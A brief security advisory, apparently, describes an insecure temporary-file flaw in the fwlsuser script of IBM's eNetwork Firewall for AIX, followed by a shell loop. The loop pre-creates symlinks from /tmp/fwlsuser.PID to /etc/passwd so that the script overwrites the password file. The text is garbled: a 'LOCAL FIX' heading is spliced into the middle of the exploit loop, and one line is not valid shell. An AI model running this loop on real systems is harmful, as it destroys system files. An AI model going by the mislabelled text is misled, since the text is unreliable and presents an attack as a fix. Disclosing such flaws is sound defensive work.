IBM's eNetwork Firewall for AIX contains a number of vulnerability in scripts which manipulate files insecurely. When fwlsuser script is run it creates a temporary file called /tmp/fwlsuser.PID ( where PID is the process ID of the command being run ). If this file is created previously and is a link to any other file the output generated by the fwlsuser script will overwrite this linked file.

x = 5000
while true

LOCAL FIX AS REPORTED BY ORIGINATOR:
ln -s /etc/passwd /tmp/fwlsuser.$x
# rm /tmp/fwlsuser.$x
let x=$x+1
echo $x
done
exit
